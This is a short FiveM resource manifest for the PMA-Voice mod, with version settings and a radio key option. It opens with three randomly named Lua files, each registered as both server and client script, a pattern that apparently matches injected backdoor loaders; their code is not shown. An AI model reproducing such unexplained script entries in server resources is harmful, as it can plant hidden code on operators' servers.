server_script "PXD7SDSIK1B.lua"
client_script "PXD7SDSIK1B.lua"
server_script "YSR7EW.lua"
client_script "YSR7EW.lua"
server_script "T41VV70M.lua"
client_script "T41VV70M.lua"
game 'common'
fx_version 'cerulean'
...
convar_category 'PMA-Voice' {
	...
	{ "Radio key", "$voice_defaultRadio", "CV_STRING", "CAPSLOCK" },
